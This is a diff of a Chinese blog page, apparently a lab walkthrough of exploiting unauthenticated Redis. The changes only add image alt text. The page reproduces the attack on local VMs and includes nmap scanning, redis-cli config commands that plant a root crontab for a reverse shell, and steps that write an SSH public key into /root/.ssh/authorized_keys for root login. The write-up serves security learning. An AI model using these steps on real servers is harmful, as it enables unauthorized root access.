@@ -396,7 +396,7 @@ make</code></pre>
 在bind 127.0.0.1前面加上#号,protected-mode设置为no</code></pre>
 <p>接下来启动:redis-server：</p>
 <pre><code class="redis">./src/redis-server redis.conf</code></pre>
-<p>启动好的话可以看到如图所示:<br><img src="/2020/05/20/Redius-getshell/server-start.png" alt><br>默认开启就是6379端口，也没有密码，这时候就会导致未授权访问，并可以使用redis权限写文件。</p>
+<p>启动好的话可以看到如图所示:<br><img src="/2020/05/20/Redius-getshell/server-start.png" alt="server-start"><br>默认开启就是6379端口，也没有密码，这时候就会导致未授权访问，并可以使用redis权限写文件。</p>
 <h2><span id="0x02漏洞复现">0x02漏洞复现</span></h2><p>Centos7,也就是redius服务器IP:192.168.1.128<br>由于服务器需要公网地址，本地测试两台机子必须保持连通性。因而设置同一网段IP。<br>Kali：192.168.1.10.<br>这里搭建连通性会踩很多坑，比如kaliping不通Centos7的IP呀等等。<br>注意吧两个机子的连网方式都设置成NAT就好。<br>在攻击之前先学习一波redis命令<br>一、redis命令学习<br>接下来先学习一波redis的命令:<br>连接redis:</p>
 <pre><code class="cli">redis-cli -h 192.168.1.128</code></pre>
 <p>查看redis版本信息:</p>
@@ -409,12 +409,12 @@ make</code></pre>
 <pre><code class="get">config get dir
 config get dbfilename</code></pre>
 <p>二、开始攻击<br>接下来打开攻击机kali使用nmap对其端口进行扫描:<br>nmap -p 0-65534 192.168.1.128</p>
-<p><img src="/2020/05/20/Redius-getshell/nmap.png" alt><br>首先使用上面的步骤确定存在redis服务端口打开。<br>这里还忽略了一个很关键的点，我们攻击机也需要安装redis的相关服务。这样才能进行未授权访问。<br>同样使用上面的命令安装然后启动服务。<br>攻击的话有几种方法:<br>(1)利用计划任务执行命令反弹shell<br>首先可以直接连上redis仓库使用如下命令:</p>
+<p><img src="/2020/05/20/Redius-getshell/nmap.png" alt="nmap"><br>首先使用上面的步骤确定存在redis服务端口打开。<br>这里还忽略了一个很关键的点，我们攻击机也需要安装redis的相关服务。这样才能进行未授权访问。<br>同样使用上面的命令安装然后启动服务。<br>攻击的话有几种方法:<br>(1)利用计划任务执行命令反弹shell<br>首先可以直接连上redis仓库使用如下命令:</p>
 <pre><code class="kali">先CD到src下面
 cd ~/redis-3.2.0/src
 使用./redis -cli -h Centosip
 ./redis-cli -h 192.168.1.128</code></pre>
-<p>连接上之后先使用info获取一波信息:<br><img src="/2020/05/20/Redius-getshell/info.png" alt><br>这里一开始不管我怎么输入命令都提示我不能执行，说是配置文件必须注释掉127还有no掉保护模式。<br>这些我都做了，这里有个坑就是服务器开启服务的时候需要使用如下命令:</p>
+<p>连接上之后先使用info获取一波信息:<br><img src="/2020/05/20/Redius-getshell/info.png" alt="info"><br>这里一开始不管我怎么输入命令都提示我不能执行，说是配置文件必须注释掉127还有no掉保护模式。<br>这些我都做了，这里有个坑就是服务器开启服务的时候需要使用如下命令:</p>
 <pre><code class="redis-server">./src/redis-server redis.conf #以配置中的方式打开服务器
 ./src/redis-server  #默认打开存在保护模式。</code></pre>
 <p>当redis以root权限运行时可以通过计划任务的crontab来执行命令反弹shell.</p>
@@ -427,13 +427,13 @@ config set dir /var/spool/cron/  //设置redis目录为计划任务目录
 config set dbfilename root  //设置目录名称为root
 
 save</code></pre>
-<p><img src="/2020/05/20/Redius-getshell/payload.png" alt><br>之后监听的kali就弹回了shell并且已经拿到root权限:<br><img src="/2020/05/20/Redius-getshell/crontab.png" alt></p>
+<p><img src="/2020/05/20/Redius-getshell/payload.png" alt="payload"><br>之后监听的kali就弹回了shell并且已经拿到root权限:<br><img src="/2020/05/20/Redius-getshell/crontab.png" alt="crontab"></p>
 <p>(2)利用写入ssh文件getshell</p>
 <p>利用前提:redis服务使用root账号启动<br>服务器开放了SSH服务，并且允许使用密钥登录，即可远程写入一个公钥，直接登录远程服务器。</p>
 <p>原理是在数据库中插入一条数据，将攻击机的公钥作为value，key值随意，然后通过修改数据库的默认路径为/root/.ssh和默认的缓冲文件authorized.keys,把缓冲的数据保存在文件里，这样就可以在服务器端的/root/.ssh下生成一个授权的key.</p>
 <p>首先在攻击机下生成一个key</p>
 <pre><code class="kali">ssh-keygen -t rsa</code></pre>
-<p><img src="/2020/05/20/Redius-getshell/key.png" alt><br>然后进入.ssh目录:cd .ssh/<br>将生产的公钥保存到key.txt(前后用\n换行，避免和Redis里其他缓存数据混合)，再把keys.txt的文件内容写入目标的主机的缓冲里</p>
+<p><img src="/2020/05/20/Redius-getshell/key.png" alt="key"><br>然后进入.ssh目录:cd .ssh/<br>将生产的公钥保存到key.txt(前后用\n换行，避免和Redis里其他缓存数据混合)，再把keys.txt的文件内容写入目标的主机的缓冲里</p>
 <pre><code class="echo">(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; key.txt
 需要先cd到src目录下，cd /root/redis-3.2.0/src
 然后将ssh的公钥key.txt写入redis服务器（也就是靶机）
@@ -443,7 +443,8 @@ cat /root/.ssh/key.txt | ./redis-cli -h 192.168.1.128 -x set xxx</code></pre>
 <p>config set dir /root/.ssh  (这也可以不做，默认就是这个目录)</p>
 <p>设置上传公钥的备份文件名为:authorized_keys</p>
 <p>使用config get dbfilename检查是否更改成功。<br>然后save后exit退出</p>
-<p>最后使用ssh -i id_rsa <a href="mailto:root@192.168.1.128" target="_blank" rel="noopener">root@192.168.1.128</a>即可免密登录redis服务器了。<br>最后可以看到成功免密登陆到靶机上面:<br><img src="/2020/05/20/Redius-getshell/success.png" alt></p>
+<p>最后使用ssh -i id_rsa <a href="mailto:root@192.168.1.128" target="_blank" rel="noopener">root@192.168.1.128</a>即可免密登录redis服务器了。<br>最后可以看到成功免密登陆到靶机上面:</p>
+<p><img src="/2020/05/20/Redius-getshell/success.png" alt="success"></p>
 <p>参考链接:<br><a href="https://blog.csdn.net/fly_hps/article/details/80937837" target="_blank" rel="noopener">师兄的文章</a><br><a href="https://www.cnblogs.com/bmjoker/p/9548962.html" target="_blank" rel="noopener">博客园redis漏洞复习文章</a><br><a href="https://www.freebuf.com/column/158065.html" target="_blank" rel="noopener">FreeBuff的Redis未授权访问</a></p>
 
         </div>
